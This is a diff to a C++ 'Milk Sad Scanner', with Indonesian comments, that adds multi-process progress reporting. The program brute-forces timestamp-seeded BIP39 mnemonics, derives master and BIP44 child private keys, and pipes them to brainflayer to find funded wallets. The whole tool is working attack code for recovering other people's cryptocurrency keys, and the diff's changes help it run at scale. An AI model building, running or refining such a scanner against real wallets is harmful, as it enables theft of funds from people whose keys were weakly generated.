@@ -1,7 +1,9 @@
 /**
  * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL)
  * 
- * Upgrade: mengirim master key + child key BIP44 ke brainflayer
+ * Upgrade: 
+ * - mengirim master key + child key BIP44 ke brainflayer
+ * - progress reporting via file-based counters
  */
 
 #define _DEFAULT_SOURCE
@@ -30,6 +32,7 @@
 #include <atomic>
 #include <random>
 #include <cstring>
+#include <cstdio>   // untuk FILE*, fopen, dll
 
 // ================= CONFIG =================
 const std::string WORDLIST_FILE = "./Wordlist/english.txt";
@@ -238,13 +241,17 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
 
     const uint32_t H = 0x80000000;
 
+    // File untuk progress reporting
+    std::string prog_file = "/tmp/milksad_progress_" + std::to_string(getpid()) + ".tmp";
+    uint64_t processed_timestamps = 0;
+
     for (uint64_t ts = start; ts <= end && !g_stop_flag; ts += step) {
 
         std::string m = generate_mnemonic_bip39((uint32_t)ts, wordlist);
         auto seed = mnemonic_to_seed(m);
         auto master = hd_master_key_from_seed(seed);
 
-        // === KIRIM MASTER PRIVATE KEY ===
+        // Kirim master private key
         std::string master_hex = to_hex(master.key);
         fprintf(pipe, "%s\n", master_hex.c_str());
 
@@ -268,7 +275,25 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
                 derived++;
             }
         }
+
+        // Update progress counter
+        processed_timestamps++;
+        if (processed_timestamps % 100 == 0) {
+            FILE* fp = fopen(prog_file.c_str(), "w");
+            if (fp) {
+                fprintf(fp, "%llu\n", (unsigned long long)processed_timestamps);
+                fclose(fp);
+            }
+        }
     }
+
+    // Tulis progress terakhir
+    FILE* fp = fopen(prog_file.c_str(), "w");
+    if (fp) {
+        fprintf(fp, "%llu\n", (unsigned long long)processed_timestamps);
+        fclose(fp);
+    }
+
     pclose(pipe);
 }
 
@@ -294,6 +319,7 @@ int main() {
 
     uint64_t start = timegm(&tm1);
     uint64_t end = timegm(&tm2);
+    uint64_t total_timestamps = end - start + 1;
 
     int threads;
     std::cout << "Threads: "; std::cin >> threads;
@@ -303,16 +329,61 @@ int main() {
     for (int i = 0; i < threads; i++) {
         pid_t pid = fork();
         if (pid == 0) {
-            worker_process(i, start + i, end, threads, wordlist, 5);
+            worker_process(i, start + i, end, threads, wordlist, 2);
             exit(0);
         } else {
             g_child_pids[i] = pid;
         }
     }
 
-    int status;
-    while (wait(&status) > 0);
+    // --- Progress monitoring loop ---
+    time_t start_time = time(nullptr);
+    uint64_t last_processed = 0;
 
-    std::cout << "Done\n";
+    while (true) {
+        sleep(2); // Update setiap 2 detik
+
+        // Cek apakah semua child masih hidup
+        int alive = 0;
+        for (pid_t pid : g_child_pids) {
+            if (kill(pid, 0) == 0) alive++;
+        }
+        if (alive == 0) break; // Semua selesai
+
+        // Baca progress dari setiap child
+        uint64_t sum_processed = 0;
+        for (pid_t pid : g_child_pids) {
+            std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
+            FILE* fp = fopen(prog_file.c_str(), "r");
+            if (fp) {
+                unsigned long long val;
+                if (fscanf(fp, "%llu", &val) == 1) {
+                    sum_processed += val;
+                }
+                fclose(fp);
+            }
+        }
+
+        time_t now = time(nullptr);
+        double elapsed = difftime(now, start_time);
+        double percent = (double)sum_processed / total_timestamps * 100.0;
+        double rate = (elapsed > 0) ? sum_processed / elapsed : 0;
+        double eta = (rate > 0) ? (total_timestamps - sum_processed) / rate : 0;
+
+        printf("\rProgress: %llu/%llu (%.2f%%) | Rate: %.1f ts/s | Elapsed: %.0fs | ETA: %.0fs   ",
+               (unsigned long long)sum_processed, (unsigned long long)total_timestamps,
+               percent, rate, elapsed, eta);
+        fflush(stdout);
+
+        last_processed = sum_processed;
+    }
+
+    // Hapus file progress
+    for (pid_t pid : g_child_pids) {
+        std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
+        unlink(prog_file.c_str());
+    }
+
+    printf("\nDone. Semua proses selesai.\n");
     return 0;
 }
